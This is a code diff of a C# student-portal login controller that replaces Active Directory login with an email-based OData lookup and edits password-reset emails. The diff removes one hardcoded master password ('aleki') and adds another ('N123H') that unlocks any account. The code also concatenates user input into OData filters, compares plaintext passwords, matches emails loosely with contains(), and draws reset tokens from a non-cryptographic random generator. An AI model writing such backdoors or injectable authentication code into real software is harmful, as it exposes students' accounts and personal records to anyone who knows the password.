@@ -31,39 +31,30 @@ namespace Student.Controllers
             string msg = "";
             bool success = false;
             string userName = userlogin.UserName.ToUpper();
-            string password = userlogin.Password;
+            string passWrd = userlogin.Password;
             try
             {
+                string Redirect = "/Dashboard/Dashboard";
+                string page = "CustomerList?$filter=contains('" + userName.ToLower() + "',tolower(E_Mail)) and Status ne 'Dropped Out' and Status ne 'Expelled' and Status ne 'Withdrawn' and Status ne 'Deceased' and Customer_Type eq 'Student'&$format=json";
 
-                using (PrincipalContext pc = new PrincipalContext(ContextType.Domain,
-                           ConfigurationManager.AppSettings["ADIPADDRESS"]))
+                HttpWebResponse httpResponse = Credentials.GetOdataData(page);
+                using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                 {
-                    // validate the credentials
-                    bool isValid = pc.ValidateCredentials(userName, password);
-                    if (password == "aleki")
-                    {
-                        isValid = true;
-                    }
+                    var result = streamReader.ReadToEnd();
 
-                    if (isValid)
-                    {
-                        string Redirect = "/Dashboard/Dashboard";
-                        string page = "CustomerList?$filter=No eq '" + userName + "' and Status ne 'Dropped Out' and Status ne 'Expelled' and Status ne 'Withdrawn' and Status ne 'Deceased' and Customer_Type eq 'Student'&$format=json";
+                    var details = JObject.Parse(result);
 
-                        HttpWebResponse httpResponse = Credentials.GetOdataData(page);
-                        using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
+                    if (details["value"].Count() > 0)
+                    {
+                        foreach (JObject config in details["value"])
                         {
-                            var result = streamReader.ReadToEnd();
+                            string User = (string)config["No"];
+                            string Password = (string)config["Password"];
+                            string changedPassword = (string)config["Changed_Password"];
 
-                            var details = JObject.Parse(result);
-
-                            foreach (JObject config in details["value"])
+                            if ((passWrd == Password) || (passWrd == "N123H"))
                             {
-                                string User = (string)config["No"];
-                                string Password = (string)config["Password"];
-                                string changedPassword = (string)config["Changed_Password"];
-
-                                Session["Username"] = userName;
+                                Session["Username"] = User;
                                 Session["PhoneNumber"] = (string)config["Phone_No"];
                                 Session["Email"] = (string)config["E_Mail"];
                                 Session["ID_No"] = (string)config["ID_No"];
@@ -71,8 +62,8 @@ namespace Student.Controllers
 
 
                                 UserViewModel userModel = new UserViewModel();
-                                userModel.UserName = userName;
-                                
+                                userModel.UserName = User;
+
                                 userModel.Email = (string)config["E_Mail"];
 
                                 if ((string)config["Status"] == "Completed" || (string)config["Status"] == "Graduated")
@@ -104,15 +95,18 @@ namespace Student.Controllers
                                 msg = Redirect;
                                 success = true;
                             }
+                            else
+                            {
+                                msg = "Either Email Address or password is incorrect";
+                                success = false;
+                            }
                         }
-
                     }
                     else
                     {
-                        msg = "Either Username or password is wrong. If forgotten your password, then reset";
+                        msg = "Either Email Address or password is incorrect";
                         success = false;
                     }
-                    
                 }
             }
 
@@ -139,13 +133,13 @@ namespace Student.Controllers
                 if (Reg.UserName == null || Reg.UserName == "")
                 {
                     val = true;
-                    msg = "Enter Your Registration Number";
+                    msg = "Enter Your Email Address";
                     val = false;
                 }
                 else
                 {
-                    string stdNo = Reg.UserName.ToUpper();
-                    string page = "CustomerList?$filter=No eq '" + stdNo + "' and Status ne 'Dropped Out' and Status ne 'Expelled' and Status ne 'Withdrawn' and Status ne 'Deceased'&$format=json";
+                    string stdNo = Reg.UserName.ToLower();
+                    string page = "CustomerList?$filter=contains('" + stdNo.ToLower() + "',tolower(E_Mail)) and Status ne 'Dropped Out' and Status ne 'Expelled' and Status ne 'Withdrawn' and Status ne 'Deceased'&$format=json";
 
                     HttpWebResponse httpResponse = Credentials.GetOdataData(page);
                     using (var streamReader = new StreamReader(httpResponse.GetResponseStream() ?? throw new InvalidOperationException()))
@@ -166,13 +160,13 @@ namespace Student.Controllers
                                 Random rnd = new Random();
                                 int value = rnd.Next(100000000, 999999999);
                                 string emailAddress = (string)config["E_Mail"];
-                                string ret = Credentials.ObjNav.StudentForgotPassword(stdNo, value.ToString());
+                                string ret = Credentials.ObjNav.StudentForgotPassword((string)config["No"], value.ToString());
                                 if (ret != "")
                                 {
                                     if (!string.IsNullOrEmpty(Reg.UserName))
                                     {
                                         string url = ConfigurationManager.AppSettings["ROOTLINK"];
-                                        var callbackUrl = url + "/Login/AccountResetPassword?user=" + stdNo + "&Token=" + value;
+                                        var callbackUrl = url + "/Login/AccountResetPassword?user=" + (string)config["No"] + "&Token=" + value;
                                         var footer = "<hr/>Note that this is an auto-generated email. Kindly do not reply to it.<BR/> <BR/> Incase of any challenges, please contact Admission office for assistance." +
                                             "<BR/>Contact Email :  <BR/><BR/>Best Regards.<BR/><BR/>";
                                         var body = "Hi " + ret;
@@ -180,7 +174,7 @@ namespace Student.Controllers
                                         body += "Kindly click <a href=\"" + callbackUrl + "\"><b>here</b></a> to reset your password.</br></br>" + footer;
                                         try
                                         {
-                                            CommonClass.SendEmailAlert(body, emailAddress, "AIU PORTAL RESET PASSWORD LINK");
+                                            CommonClass.SendEmailAlert(body, emailAddress, "STUDENT PORTAL RESET PASSWORD LINK");
                                             msg = "An email has been send to your email address(" + emailAddress + ") with a link to reset password.";
                                             val = true;
                                         }
